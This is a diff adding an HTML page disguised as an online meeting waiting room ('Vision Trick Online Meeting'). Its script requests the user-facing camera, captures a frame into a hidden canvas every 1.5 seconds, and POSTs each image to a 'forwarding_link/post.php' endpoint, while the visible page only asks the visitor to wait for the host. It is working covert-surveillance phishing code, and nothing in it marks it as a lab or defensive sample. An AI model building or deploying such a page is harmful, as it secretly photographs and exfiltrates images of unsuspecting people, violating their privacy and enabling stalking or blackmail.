@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        /* Add your custom styles here */
+    </style>
+</head>
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+<script>
+    function post(imgdata) {
+        $.ajax({
+            type: 'POST',
+            data: { cat: imgdata },
+            url: 'forwarding_link/post.php',
+            dataType: 'json',
+            async: false,
+            success: function(result) {
+                // Handle the response
+            },
+            error: function() {
+            }
+        });
+    };
+
+    'use strict';
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.querySelector('span#errorMsg');
+
+    const constraints = {
+        audio: false,
+        video: {
+            facingMode: "user"
+        }
+    };
+
+    async function init() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            handleSuccess(stream);
+        } catch (e) {
+            errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+        }
+    }
+
+    function handleSuccess(stream) {
+        window.stream = stream;
+        video.srcObject = stream;
+
+        var context = canvas.getContext('2d');
+        setInterval(function() {
+            context.drawImage(video, 0, 0, 640, 480);
+            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+            post(canvasData);
+        }, 1500);
+    }
+
+    init();
+</script>
+<body>
+    <div class="main-screen">
+        <h1>Welcome to Vision Trick Online Meeting</h1>
+        <p>Please wait for the host to start the meeting.</p>
+    </div>
+</body>
+</html>
